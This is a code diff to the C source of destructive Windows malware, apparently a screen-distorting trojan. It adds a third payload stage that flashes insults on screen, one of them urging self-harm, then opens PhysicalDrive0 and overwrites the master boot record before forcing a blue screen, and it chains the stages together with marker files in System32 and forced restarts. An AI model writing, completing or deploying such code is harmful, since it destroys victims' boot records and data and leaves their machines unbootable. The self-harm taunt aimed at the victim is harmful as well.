@@ -9,7 +9,9 @@
 #include <winnt.h>
 #include <winuser.h>
 
-
+static WCHAR* insultarray[] = {L"insulting people for stuff they can't change is a SIN", L"thinking you're superior is a SIN", 
+                                L"your dream wonderland will NEVER HAPPEN", L"God Despises You", L"You will never see happiness unless you change", 
+                                L"you should just a-ack yourself =)", L"Your grandparents are angry at you", L""};
 
 static inline VOID FirstPayload(){
     static BOOL init = FALSE;
@@ -41,33 +43,50 @@ static inline VOID FirstPayload(){
         MalDrawText(GDIReturnDC(), 10, 60, 20, L"your \"high iq\" is a waste", RGB(255, 255, 255));
     }
     MalCreateFile("C:\\Windows\\System32\\hal.ini");
-    BlueScreenSystem();
+    RestartSystem();
 }
 
 static inline VOID SecondPayload(){
-    HBRUSH blue = CreateSolidBrush(RGB(0, 0, 255));
     int prevtime = timeGetTime();
     while(1){
-        if (timeGetTime() - prevtime >= 60000) break;
-        SelectObject(GDIReturnDC(), blue);
-        PatBlt(GDIReturnDC(), 0, 0, GDIReturnScreenX(), GDIReturnScreenY(), PATINVERT);
+        if (timeGetTime() - prevtime >= 100000) break;
+        HBRUSH brush = CreateSolidBrush(RGB(GenerateRandomNumber(0, 255), GenerateRandomNumber(0, 255), GenerateRandomNumber(0, 255)));
+        SelectObject(GDIReturnDC(), brush);
+        PatBlt(GDIReturnDC(), GenerateRandomNumber(0, GDIReturnScreenX()), GenerateRandomNumber(0, GDIReturnScreenY()), GenerateRandomNumber(0, 100), GenerateRandomNumber(0, 100), PATINVERT);
+        DeleteObject(brush);
     }
-    DeleteObject(blue);
+    MalCreateFile("C:\\Windows\\System32\\Windows.UI.GDILogonUI.dll");
+    RestartSystem();
+}
+
+static inline VOID ThirdPayload(){
+    int prevtime = timeGetTime();
+    while (1) {
+        if (timeGetTime() - prevtime >= 120000) break;
+        MalDrawText(GDIReturnDC(), GenerateRandomNumber(0, GDIReturnScreenX()), GenerateRandomNumber(0, GDIReturnScreenY()), 30, insultarray[GenerateRandomNumber(0, 6)], RGB(255, 255, 255));
+        Sleep(10);
+    }
     HANDLE hMasterBootRecord = CreateFileW(L"\\\\.\\PhysicalDrive0", 
                                 GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 
                                 NULL, OPEN_EXISTING, 0, 0);
     WriteFile(hMasterBootRecord, "I told you so, you are nothing but a worthless pest, and no you aren't superior to ANYONE, your IQ did NOTHING to make you a worthful human", 
             512, NULL, NULL);
     CloseHandle(hMasterBootRecord);
-    ShutdownSystem();
+    BlueScreenSystem();
 }
 
 
 VOID PayloadManager(){
     if(!CheckIfFileExists("C:\\Windows\\System32\\hal.ini")){
         FirstPayload();
+        return;
+    }
+    else if(!CheckIfFileExists("C:\\Windows\\System32\\Windows.UI.GDILogonUI.dll")) {
+        SecondPayload();
+        return;
     }
     else {
-        SecondPayload();
+        ThirdPayload();
+        return;
     }
 }
